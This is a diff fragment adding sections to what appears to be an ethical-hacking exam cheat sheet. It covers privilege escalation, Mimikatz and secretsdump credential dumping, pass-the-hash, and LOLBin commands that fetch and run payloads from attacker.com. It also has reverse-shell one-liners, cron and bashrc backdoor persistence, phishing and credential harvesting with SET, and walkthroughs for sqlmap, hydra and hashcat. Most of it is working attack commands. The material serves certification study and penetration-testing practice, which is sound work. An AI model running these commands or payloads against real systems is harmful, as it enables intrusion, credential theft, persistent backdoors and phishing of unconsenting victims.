+find / -perm -u=s -type f 2>/dev/null     # Alternative SUID search
+
+# GTFOBins - https://gtfobins.github.io/
+# Check if any SUID binary can be exploited
+
+# Cron jobs
+cat /etc/crontab
+cat /var/spool/cron/crontabs/*
+ls -la /etc/cron.*
+
+# Writable files in sensitive locations
+find / -writable -type f 2>/dev/null
+ls -la /etc/passwd                        # Can we write?
+ls -la /etc/shadow
+
+# Capabilities
+getcap -r / 2>/dev/null
+
+# Kernel exploits
+searchsploit linux kernel $(uname -r | cut -d'-' -f1)
+
+# LinPEAS - Automated enumeration
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+# Common privilege escalation vectors
+# - SUID/SGID binaries (GTFOBins)
+# - Misconfigured sudo
+# - Writable /etc/passwd
+# - Kernel exploits (DirtyCow, etc.)
+# - Docker group membership
+# - Cron job exploitation
+# - PATH hijacking
+```
+
+#### Windows Privilege Escalation
+
+```bash
+# Basic enumeration
+whoami                                     # Current user
+whoami /priv                              # Privileges
+whoami /groups                            # Group memberships
 systeminfo                                 # System info
+hostname                                   # Computer name
+
+# Users and groups
 net user                                   # List users
-net localgroup administrators             # Admin group members
+net localgroup                            # List groups
+net localgroup administrators             # Admin members
+net user username                         # User details
+
+# Running processes
+tasklist /v
+wmic process list brief
+
+# Services
+wmic service get name,startname,pathname
+sc query state= all
+
+# Unquoted service paths
+wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
+
+# Always install elevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+# Stored credentials
+cmdkey /list
+dir C:\Users\username\AppData\Local\Microsoft\Credentials\
+dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
+
+# WinPEAS - Automated enumeration
+# Download and run winPEAS.exe
+
+# Common Windows priv esc vectors
+# - Unquoted service paths
+# - Weak service permissions
+# - AlwaysInstallElevated
+# - Stored credentials
+# - SeImpersonatePrivilege (Potato attacks)
+# - Kernel exploits
+```
+
+### Windows Post-Exploitation
+
+```bash
+# Credential dumping (Meterpreter)
+hashdump                                  # Dump SAM hashes
+load kiwi                                 # Load Mimikatz extension
+creds_all                                 # Dump all credentials
+lsa_dump_sam                              # Dump SAM
+lsa_dump_secrets                          # Dump LSA secrets
+
+# Windows credential locations
+reg save HKLM\SAM sam.bak
+reg save HKLM\SYSTEM system.bak
+# Then crack offline with samdump2 or secretsdump.py
+
+# Secretsdump (Impacket)
+secretsdump.py domain/user:password@192.168.1.10
+secretsdump.py -sam sam.bak -system system.bak LOCAL
+
+# Pass the Hash
+pth-winexe -U administrator%hash //192.168.1.10 cmd.exe
+psexec.py -hashes :ntlm_hash domain/user@192.168.1.10
+wmiexec.py -hashes :ntlm_hash domain/user@192.168.1.10
+
+# Token manipulation (Meterpreter)
+use incognito
+list_tokens -u
+impersonate_token "NT AUTHORITY\SYSTEM"
+```
+
+### Living Off The Land (LOLBins)
+
+```bash
+# Windows LOLBins - https://lolbas-project.github.io/
+
+# Download files
+certutil -urlcache -split -f http://attacker.com/shell.exe shell.exe
+bitsadmin /transfer myJob /download /priority normal http://attacker.com/shell.exe C:\shell.exe
+powershell -c "(New-Object Net.WebClient).DownloadFile('http://attacker.com/shell.exe','shell.exe')"
+curl http://attacker.com/shell.exe -o shell.exe
+
+# Execute payloads
+mshta http://attacker.com/payload.hta
+msiexec /q /i http://attacker.com/payload.msi
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";document.write();h=new%20ActiveXObject("WScript.Shell").Run("calc.exe")
+
+# Bypass execution policy
+powershell -ep bypass -f script.ps1
+powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')"
+
+# Encode commands
+powershell -enc [BASE64_ENCODED_COMMAND]
+
+# Linux LOLBins - https://gtfobins.github.io/
+
+# Reverse shells
+bash -i >& /dev/tcp/attacker/4444 0>&1
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("attacker",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+nc -e /bin/bash attacker 4444
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker 4444 >/tmp/f
+
+# File transfers
+wget http://attacker.com/file
+curl http://attacker.com/file -o file
+nc -lvnp 4444 > file (receiver) / nc attacker 4444 < file (sender)
+```
+
+### Persistence Techniques
+
+```bash
+# Windows persistence
+# Registry run keys
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\backdoor.exe"
+
+# Scheduled task
+schtasks /create /tn "Backdoor" /tr "C:\backdoor.exe" /sc onlogon
+
+# Startup folder
+copy backdoor.exe "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
+
+# WMI event subscription (Meterpreter)
+run persistence -h
+
+# Linux persistence
+# Cron job
+echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'" >> /etc/crontab
+
+# SSH authorized keys
+echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
+
+# Bashrc
+echo "bash -i >& /dev/tcp/attacker/4444 0>&1" >> ~/.bashrc
+
+# SUID binary
+cp /bin/bash /tmp/rootbash
+chmod +s /tmp/rootbash
 ```
 
 ### Common Malware Ports
@@ -1509,6 +2613,194 @@ Online sandboxes:
 
 ---
 
+## 🔎 OSINT & Reconnaissance
+
+### Passive Reconnaissance
+
+```bash
+# WHOIS lookup
+whois domain.com
+whois 192.168.1.10
+
+# DNS reconnaissance
+dig domain.com any                        # All records
+dig domain.com mx                         # Mail servers
+dig domain.com ns                         # Name servers
+dig domain.com txt                        # TXT records
+host -t any domain.com
+
+# Reverse DNS
+dig -x 192.168.1.10
+host 192.168.1.10
+
+# Subdomain enumeration
+subfinder -d domain.com
+amass enum -passive -d domain.com
+assetfinder --subs-only domain.com
+
+# Certificate transparency logs
+curl "https://crt.sh/?q=%.domain.com&output=json" | jq -r '.[].name_value' | sort -u
+```
+
+### Website Reconnaissance
+
+```bash
+# Technology fingerprinting
+whatweb http://192.168.1.10
+wappalyzer                               # Browser extension
+
+# Website cloning
+wget -r -k -l 5 -p -E -nc http://192.168.1.10
+httrack http://192.168.1.10
+
+# Robots.txt and sitemap
+curl http://192.168.1.10/robots.txt
+curl http://192.168.1.10/sitemap.xml
+
+# Extract links
+lynx -dump http://192.168.1.10 | grep -E 'http|https'
+
+# Screenshot websites
+cutycapt --url=http://192.168.1.10 --out=screenshot.png
+eyewitness --web -f urls.txt
+```
+
+### Email Harvesting
+
+```bash
+# theHarvester
+theHarvester -d domain.com -b all
+theHarvester -d domain.com -b google,linkedin,bing
+
+# Email format patterns
+firstname.lastname@domain.com
+flastname@domain.com
+firstnamel@domain.com
+firstname@domain.com
+```
+
+### Google Dorking
+
+```bash
+# Common dorks
+site:domain.com                           # Limit to domain
+filetype:pdf site:domain.com              # Find PDFs
+intitle:"index of"                        # Directory listings
+inurl:admin                               # Admin pages
+"password" filetype:txt site:domain.com   # Password files
+ext:sql intext:password                   # SQL files with passwords
+intext:"@domain.com"                      # Email addresses
+
+# Sensitive file discovery
+filetype:log site:domain.com
+filetype:conf site:domain.com
+filetype:bak site:domain.com
+filetype:sql site:domain.com
+filetype:env site:domain.com
+
+# Vulnerable systems
+inurl:"wp-admin"                          # WordPress admin
+intitle:"phpMyAdmin"                      # phpMyAdmin
+inurl:"/cgi-bin/"                        # CGI scripts
+```
+
+### Social Engineering Resources
+
+```bash
+# LinkedIn enumeration
+# Search company employees
+# Identify email patterns
+# Map organizational structure
+
+# Maltego
+# Visual link analysis
+# Automated OSINT gathering
+# Infrastructure mapping
+
+# SpiderFoot
+spiderfoot -s domain.com -t all
+```
+
+---
+
+## 🎭 Social Engineering Toolkit (SET)
+
+### SET Menu Options
+
+```bash
+# Launch SET
+setoolkit
+
+# Main menu options:
+# 1) Social-Engineering Attacks
+# 2) Penetration Testing (Fast-Track)
+# 3) Third Party Modules
+# 4) Update the Social-Engineer Toolkit
+
+# Social Engineering Attacks:
+# 1) Spear-Phishing Attack Vectors
+# 2) Website Attack Vectors
+# 3) Infectious Media Generator
+# 4) Create a Payload and Listener
+# 5) Mass Mailer Attack
+# 6) Arduino-Based Attack Vector
+# 7) Wireless Access Point Attack
+# 8) QRCode Generator Attack
+# 9) Powershell Attack Vectors
+# 10) SMS Spoofing Attack
+```
+
+### Credential Harvester
+
+```bash
+# SET → Social Engineering Attacks → Website Attack Vectors → Credential Harvester
+
+# Options:
+# 1) Web Templates - Pre-built login pages (Google, Facebook, etc.)
+# 2) Site Cloner - Clone any website
+# 3) Custom Import - Import your own HTML
+
+# Steps for Site Cloner:
+# 1. Select option 2 (Site Cloner)
+# 2. Enter your IP (listener)
+# 3. Enter target URL to clone
+# 4. Send phishing link to victim
+# 5. Credentials logged when victim enters them
+```
+
+### Phishing Attack
+
+```bash
+# Spear Phishing Attack
+# SET → Social Engineering Attacks → Spear-Phishing Attack Vectors
+
+# Options:
+# 1) Perform a Mass Email Attack
+# 2) Create a FileFormat Payload
+# 3) Create a Social-Engineering Template
+
+# Mass Email Attack:
+# 1. Select payload (PDF, DOC, etc.)
+# 2. Configure listener
+# 3. Enter target email(s)
+# 4. Configure SMTP server
+# 5. Send attack emails
+```
+
+### Infectious Media Generator
+
+```bash
+# Create autorun payloads for USB drives
+# SET → Social Engineering Attacks → Infectious Media Generator
+
+# Creates:
+# - Metasploit payloads
+# - Autorun.inf file
+# - Ready-to-copy USB attack
+```
+
+---
+
 ## ❓ Common Exam Questions
 
 ### Question Types and Approaches
@@ -1601,6 +2893,178 @@ A: Use DIE to check entropy → Calculate hash with md5sum/sha256sum
 ```
 Q: "Decode covert TCP message"
 A: Analyze Wireshark → Check IP ID field → Convert hex to ASCII
+```
+
+#### 15. SNMP Enumeration
+```
+Q: "Find the machine name via SNMP"
+A: snmpwalk -v2c -c public 192.168.1.10 system
+   Look for sysName in output
+```
+
+#### 16. LDAP Information Extraction
+```
+Q: "Find users in the Active Directory"
+A: ldapsearch -x -H ldap://192.168.1.10 -b "dc=domain,dc=com" "(objectClass=user)" sAMAccountName
+```
+
+#### 17. DNS Zone Transfer
+```
+Q: "Extract DNS records from the server"
+A: dig axfr @192.168.1.10 domain.com
+   Or: dnsrecon -d domain.com -t axfr
+```
+
+#### 18. SSH Credential Attack
+```
+Q: "Find SSH credentials for the server"
+A: hydra -l root -P /path/wordlist.txt ssh://192.168.1.10
+   Or: nmap --script ssh-brute -p 22 192.168.1.10
+```
+
+#### 19. Hash Type Identification
+```
+Q: "Identify the hash type"
+A: hash-identifier → paste hash
+   Or: hashid -m hash_value (shows hashcat mode)
+   32 chars = MD5/NTLM, 40 chars = SHA1, 64 chars = SHA256
+```
+
+#### 20. VeraCrypt Volume Decryption
+```
+Q: "Access the encrypted volume and find the secret"
+A: veracrypt --mount /path/volume /mnt/point
+   Enter password when prompted
+   Browse to /mnt/point and read secret file
+```
+
+### Exam Scenario Walkthroughs
+
+#### Complete SQL Injection Scenario
+```bash
+# Given: Web application at http://192.168.1.10/dvwa/
+
+# Step 1: Login to DVWA
+Username: admin, Password: password
+
+# Step 2: Set security to low
+DVWA Security → Low → Submit
+
+# Step 3: Get cookies from browser (F12 → Network → Cookie)
+# PHPSESSID=abc123; security=low
+
+# Step 4: Find databases
+sqlmap -u "http://192.168.1.10/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  --cookie="PHPSESSID=abc123; security=low" --dbs
+
+# Step 5: Enumerate tables
+sqlmap -u "URL" --cookie="..." -D dvwa --tables
+
+# Step 6: Dump users table
+sqlmap -u "URL" --cookie="..." -D dvwa -T users --dump
+
+# Answer: Password from the dump (may need to crack MD5 hash)
+```
+
+#### Complete WordPress Attack Scenario
+```bash
+# Given: WordPress at http://192.168.1.10:8080/CEH/
+
+# Step 1: Enumerate users
+wpscan --url http://192.168.1.10:8080/CEH/ --enumerate u
+
+# Step 2: Find username (e.g., admin)
+
+# Step 3: Password attack
+wpscan --url http://192.168.1.10:8080/CEH/ \
+  -U admin -P /root/Desktop/wordlists/passwords.txt
+
+# Answer: admin:password123 (example)
+```
+
+#### Complete Android ADB Scenario
+```bash
+# Given: Find secret file on Android device
+
+# Step 1: Scan for ADB port
+nmap -p 5555 192.168.1.0/24
+
+# Step 2: Connect to device (e.g., 192.168.1.20)
+adb connect 192.168.1.20:5555
+
+# Step 3: List files
+adb shell ls /sdcard/
+
+# Step 4: Find and pull secret file
+adb shell find /sdcard -name "*.txt" 2>/dev/null
+adb pull /sdcard/Download/secret.txt /root/Desktop/
+
+# Answer: Content of the secret file
+```
+
+#### Complete Steganography Scenario
+```bash
+# Given: image.jpg on Desktop, find hidden message
+
+# Step 1: Analyze the file
+file image.jpg
+exiftool image.jpg
+strings image.jpg | tail -20
+
+# Step 2: Try extraction with common passwords
+steghide extract -sf image.jpg -p ""          # No password
+steghide extract -sf image.jpg -p "password"
+steghide extract -sf image.jpg -p "secret"
+
+# Step 3: If JPEG fails, check if it's PNG (use zsteg)
+zsteg image.png
+
+# Step 4: Read extracted file
+cat extracted.txt
+
+# Answer: Content of hidden message
+```
+
+#### Complete Wireshark Credential Extraction
+```bash
+# Given: capture.pcap file, find FTP credentials
+
+# Step 1: Open in Wireshark
+wireshark capture.pcap
+
+# Step 2: Filter for FTP
+Filter: ftp
+
+# Step 3: Find USER and PASS commands
+Look for packets with "Request: USER xxx"
+Look for packets with "Request: PASS xxx"
+
+# Or use tshark:
+tshark -r capture.pcap -Y "ftp.request.command == USER || ftp.request.command == PASS" -T fields -e ftp.request.arg
+
+# Answer: username:password
+```
+
+#### Complete Hash Cracking Scenario
+```bash
+# Given: MD5 hash 5f4dcc3b5aa765d61d8327deb882cf99
+
+# Step 1: Identify hash type
+hashid 5f4dcc3b5aa765d61d8327deb882cf99
+# Result: MD5
+
+# Step 2: Check online databases first
+# https://crackstation.net/
+
+# Step 3: If not found, crack with hashcat
+echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt
+hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
+
+# Or with John:
+john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+john --show hash.txt
+
+# Answer: password (in this example)
 ```
 
 ---
